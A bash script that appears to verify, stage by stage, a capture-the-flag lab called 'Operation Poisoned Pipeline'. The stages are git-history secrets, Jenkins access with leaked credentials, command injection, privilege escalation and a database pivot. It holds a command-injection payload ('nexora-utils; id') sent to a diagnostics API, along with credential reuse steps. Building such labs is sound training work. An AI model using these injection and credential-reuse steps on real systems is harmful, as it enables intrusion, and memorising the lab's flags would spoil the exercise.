#!/usr/bin/env bash
set -u

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "${ROOT_DIR}"

PASS=0
FAIL=0

pass() { echo "[PASS] $1"; PASS=$((PASS + 1)); }
fail() { echo "[FAIL] $1"; FAIL=$((FAIL + 1)); }

echo "======================================================"
echo " Operation Poisoned Pipeline"
echo " End-to-End Chain Verification"
echo "======================================================"
echo

# --- S01: Clone repository and verify history ---
echo "[S01] The Git Leak"
if docker exec pp-kali sh -lc '
    rm -rf /tmp/s01-e2e
    git -c http.sslVerify=false clone https://10.13.10.20/git/nexora/deployment-tools.git /tmp/s01-e2e 2>/dev/null
    cd /tmp/s01-e2e
    if grep -R "IE3132{PP_S01_" --exclude-dir=.git . 2>/dev/null; then
        exit 1
    fi
    if git log -p --all | grep -q "IE3132{PP_S01_"; then
        exit 0
    fi
    exit 1
' >/dev/null 2>&1; then
    pass "S01: flag exists in history, not in current tree"
else
    fail "S01: flag exists in history, not in current tree"
fi

# --- S02: Jenkins authentication and artifact retrieval ---
echo "[S02] Pipeline Breach"
source private/s01/s01.env
if docker exec pp-kali sh -lc "
    curl -kfsS -u '${S01_JENKINS_USER}:${S01_JENKINS_PASSWORD}' \
        'https://10.13.10.20/jenkins/job/${S01_JOB_NAME}/api/json' >/dev/null 2>&1
" ; then
    pass "S02: reader account can access Jenkins"
else
    fail "S02: reader account can access Jenkins"
fi

if docker exec pp-kali sh -lc "
    curl -kfsS -u '${S01_JENKINS_USER}:${S01_JENKINS_PASSWORD}' \
        'https://10.13.10.20/jenkins/job/${S01_JOB_NAME}/103/artifact/artifact-output/evidence-s03.zip' \
        -o /tmp/s02-e2e.zip 2>/dev/null
    test -s /tmp/s02-e2e.zip
" ; then
    pass "S02: reader can download S03 evidence bundle"
else
    fail "S02: reader can download S03 evidence bundle"
fi

# --- S03: Evidence correlation ---
echo "[S03] Ghost Dependency"
if docker exec pp-kali sh -lc '
    cd /tmp
    rm -rf s03-e2e
    mkdir s03-e2e
    cd s03-e2e
    unzip -q /tmp/s02-e2e.zip
    sha256sum -c SHA256SUMS >/dev/null 2>&1
' ; then
    pass "S03: evidence bundle validates"
else
    fail "S03: evidence bundle validates"
fi

# --- S04: Command injection ---
echo "[S04] Poisoned Runtime"
S04_OUT="$(docker exec pp-kali sh -lc "
    curl -kfsS -X POST \
        -H 'Content-Type: application/json' \
        -d '{\"component\":\"nexora-utils; id\"}' \
        http://10.13.10.30:5000/api/diagnostics/run 2>/dev/null
" || true)"

if grep -q 'uid=10001' <<<"${S04_OUT}"; then
    pass "S04: command executes as pipeline-app (UID 10001)"
else
    fail "S04: command executes as pipeline-app (UID 10001)"
fi

if grep -q 'uid=0' <<<"${S04_OUT}"; then
    fail "S04: command does NOT execute as root"
else
    pass "S04: command does NOT execute as root"
fi

# --- S05: Privilege escalation ---
echo "[S05] Broken Trust"
if docker exec pp-application sh -lc '
    test -x /usr/local/bin/deploy-verify
    test -w /opt/nexora/hooks/verify.sh
' >/dev/null 2>&1; then
    pass "S05: deploy-verify and writable hook exist"
else
    fail "S05: deploy-verify and writable hook exist"
fi

# --- S06: Database isolation and pivot ---
echo "[S06] Behind the Firewall"
if docker exec pp-kali ping -c 1 -W 1 10.13.20.10 >/dev/null 2>&1; then
    fail "S06: Kali cannot reach PostgreSQL directly"
else
    pass "S06: Kali cannot reach PostgreSQL directly"
fi

if docker exec pp-application nc -z -w 3 10.13.20.10 5432 >/dev/null 2>&1; then
    pass "S06: Application can reach PostgreSQL on internal_net (TCP 5432)"
else
    fail "S06: Application can reach PostgreSQL on internal_net (TCP 5432)"
fi

# --- Full chain: verify S06 flag exists in database ---
source private/s06/s06.env
DB_CHECK="$(docker compose exec -T postgres \
    psql -U postgres -d nexora_prod -tA \
    -c "SELECT record_value FROM ctf_final WHERE record_key='s06_final_record';" \
    2>/dev/null | tr -d '\r\n' || true)"

if [[ "${DB_CHECK}" == "${S06_FLAG}" ]]; then
    pass "S06: final flag exists in PostgreSQL"
else
    fail "S06: final flag exists in PostgreSQL"
fi

echo
echo "======================================================"
echo " RESULTS"
echo "======================================================"
echo "Passed: ${PASS}"
echo "Failed: ${FAIL}"
echo

if [[ "${FAIL}" -eq 0 ]]; then
    echo "END-TO-END: PASSED"
    exit 0
else
    echo "END-TO-END: FAILED"
    exit 1
fi
